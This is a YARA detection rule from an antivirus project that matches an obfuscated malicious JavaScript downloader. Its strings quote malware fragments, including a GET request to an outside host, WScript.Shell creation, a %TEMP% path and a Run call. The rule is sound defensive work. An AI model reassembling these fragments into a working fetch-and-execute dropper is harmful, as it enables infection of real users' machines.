rule sig_20160427_da891a57c0e801bcd787080c1b2439fa {
  meta:
    description = "datamaliciousorder - file 20160427_da891a57c0e801bcd787080c1b2439fa.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "e0b32068c1eb72ba9afa679f6680d778e59e0aab540b8a6683f88e76be630bcf"

  strings:
    $s1  = "FxjhtGrlui[RsjetDjnyo](\"G\" + \"ET\", \"http://myehelpers.com/j3ykf\", false);" fullword ascii
    $s2  = "function CvjxnZobvs() {return FogiqTmrxq[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"E5NG1LD" ascii
    $s3  = "function CvjxnZobvs() {return FogiqTmrxq[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"E5NG1LD" ascii
    $s4  = "function UphgoYzzmh(IrwogIccqr, NzvlrXxfpd){DjvgrPjjms = DjvgrPjjms * 1; return IrwogIccqr - NzvlrXxfpd;};" fullword ascii
    $s5  = "var FogiqTmrxq = function OybvaIqfig() {return ValgwDgupj[KztuoHmdjm](\"WScript\"+\".Shell\");}(), IptglQvheb = 11;" fullword ascii
    $s6  = "var ValgwDgupj = this[\"WScript\"];" fullword ascii
    $s7  = "if (FxjhtGrlui[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s8  = "function QradzWrgfh(){return DetdbIqapy + \"\";};" fullword ascii
    $s9  = "function CwafpSbhly() {return ((AosvtPeecp == true) && (AosvtPeecp == KxyxwQivok)) ? 1 : DjvgrPjjms;};" fullword ascii
    $s10 = "var UknoeZlrlu = new this[\"D\"+\"ate\"]();" fullword ascii
    $s11 = "var AosvtPeecp = false;" fullword ascii
    $s12 = "return UphgoYzzmh(UonbzGzjei, UdwsqKkzbq);" fullword ascii
    $s13 = "function UsxyaMyhfd()" fullword ascii
    $s14 = "}while (KvozbMhauo);" fullword ascii
    $s15 = "JalqlTnjie = true;" fullword ascii
    $s16 = "function KmcgiMhgcq(){return 23;};" fullword ascii
    $s17 = "AosvtPeecp = true; " fullword ascii
    $s18 = "var KxyxwQivok = false;" fullword ascii
    $s19 = "function XpejkSzvnl(VxjlsGuovx){FogiqTmrxq[\"R\"+\"un\"](VxjlsGuovx, DjvgrPjjms, DjvgrPjjms);};" fullword ascii
    $s20 = "function NxoeyWlcix(WjpzfFtiko) {var OrlbvSjlny = (1, 2, 3, 4, 5, WjpzfFtiko); return OrlbvSjlny;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}